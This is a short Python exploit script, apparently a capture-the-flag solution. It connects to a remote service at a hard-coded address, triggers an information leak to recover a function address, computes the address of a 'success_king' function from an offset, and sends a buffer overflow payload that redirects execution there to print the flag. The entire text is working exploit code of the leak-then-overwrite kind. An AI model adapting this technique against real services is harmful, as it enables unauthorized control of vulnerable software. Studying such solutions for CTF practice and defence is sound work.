from socket import *
import binascii
import struct
import time

def p(x):
	return struct.pack("<q", x)

addr = 0
offset = -51

sock = socket(AF_INET, SOCK_STREAM)
sock.connect(('159.203.38.169', 5683))
sock.recv(1024)
print("[*] Triggering leak...")
sock.send('knightAA' + '\n')
time.sleep(0.3)

print("[*] Retrieving address of check_knight...")
resp = sock.recv(1024).strip()
addr = resp[8:14] + '\x00'*2
addr = struct.unpack("<q", addr)[0]

print("[*] Calculating address of success_king...")
addr += offset

print("[*] Calling success_king...")
sock.send('red\0' + 'AAAA' + 'BBBBBBBB' + p(addr))
time.sleep(0.3)

resp = sock.recv(1024)
print(resp[resp.find('FLAG'):])
sock.close()
